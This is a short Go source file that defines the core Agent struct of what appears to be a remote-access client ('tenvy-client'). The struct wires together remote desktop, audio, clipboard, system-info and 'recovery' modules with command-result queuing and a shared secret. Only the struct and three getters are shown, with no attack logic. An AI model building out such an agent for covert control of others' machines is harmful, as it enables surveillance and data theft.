package agent

import (
	"log"
	"net/http"
	"sync"
	"time"

	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
	"github.com/rootbay/tenvy-client/internal/protocol"
)

type Agent struct {
	id             string
	key            string
	baseURL        string
	client         *http.Client
	config         protocol.AgentConfig
	logger         *log.Logger
	resultMu       sync.Mutex
	pendingResults []protocol.CommandResult
	startTime      time.Time
	metadata       protocol.AgentMetadata
	sharedSecret   string
	preferences    BuildPreferences
	remoteDesktop  *remotedesktop.RemoteDesktopStreamer
	systemInfo     *systeminfo.Collector
	notes          *notes.Manager
	audioBridge    *audioctrl.AudioBridge
	clipboard      *clipboard.Manager
	recovery       *recovery.Manager
	buildVersion   string
	timing         TimingOverride
}

func (a *Agent) AgentID() string {
	return a.id
}

func (a *Agent) AgentMetadata() protocol.AgentMetadata {
	return a.metadata
}

func (a *Agent) AgentStartTime() time.Time {
	return a.startTime
}
